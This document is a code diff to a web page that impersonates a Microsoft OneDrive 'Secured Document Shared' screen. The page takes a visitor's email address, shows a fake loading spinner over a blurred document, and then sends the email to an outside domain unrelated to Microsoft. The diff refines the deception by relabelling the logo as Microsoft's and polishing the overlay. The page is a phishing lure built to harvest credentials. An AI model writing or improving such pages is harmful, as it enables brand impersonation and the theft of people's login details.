@@ -12,6 +12,7 @@
       display: flex;
       flex-direction: column;
       min-height: 100vh;
+      position: relative;
     }
 
     .top-bar {
@@ -104,27 +105,54 @@
       background-color: #005a9e;
     }
 
+    .blurred-doc,
     .loading-overlay {
       display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(255, 255, 255, 0.85) url('https://upload.wikimedia.org/wikipedia/commons/3/3a/Gray_circular_spinner.gif') no-repeat center;
-      background-size: 60px;
-      z-index: 5;
     }
 
-    .blurred-doc {
+    .blurred-doc.active {
+      display: block;
       background-image: url('https://images.unsplash.com/photo-1581092334645-3000e91f38f4?auto=format&fit=crop&w=1050&q=80');
       background-size: cover;
       background-position: center;
       filter: blur(8px);
-      position: absolute;
-      top: 0; left: 0;
+      position: fixed;
+      top: 0;
+      left: 0;
       width: 100%;
       height: 100%;
-      z-index: 1;
+      z-index: 10;
       opacity: 0.2;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      z-index: 20;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .loading-overlay::before {
+      content: "";
+      width: 50px;
+      height: 50px;
+      border: 6px solid #ccc;
+      border-top-color: #0078d4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     .footer {
@@ -133,6 +161,7 @@
       color: #666;
       padding: 20px;
       margin-top: auto;
+      z-index: 1;
     }
 
     @media (max-width: 500px) {
@@ -156,11 +185,9 @@
   <div class="top-bar">OneDrive</div>
 
   <div class="logo-top">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="DocAccess Logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
     <span>Microsoft</span>
   </div>
-
-  <div class="blurred-doc"></div>
 
   <div class="container">
     <div class="section-header">Secured Document Shared</div>
@@ -176,6 +203,7 @@
     </form>
   </div>
 
+  <div class="blurred-doc" id="blurredDoc"></div>
   <div class="loading-overlay" id="loadingOverlay"></div>
 
   <div class="footer">
@@ -184,7 +212,6 @@
   </div>
 
   <script>
-    // Autofill if email is in query string (on reload or redirected back)
     function getQueryParam(param) {
       const params = new URLSearchParams(window.location.search);
       return params.get(param);
@@ -198,17 +225,19 @@
       }
     }
 
-    // Redirect logic on submit
     const form = document.getElementById('accessForm');
     const loading = document.getElementById('loadingOverlay');
+    const blur = document.getElementById('blurredDoc');
 
     form.addEventListener('submit', function (e) {
       e.preventDefault();
       const email = document.getElementById('emailInput').value.trim();
-      loading.style.display = 'block';
+      blur.classList.add('active');
+      loading.classList.add('active');
+
       setTimeout(() => {
         window.location.href = 'https://Evolution-DocuPortals.oozed.it.com/Ja1aF?email=' + email;
-      }, 3000);
+      }, 2500);
     });
   </script>
 
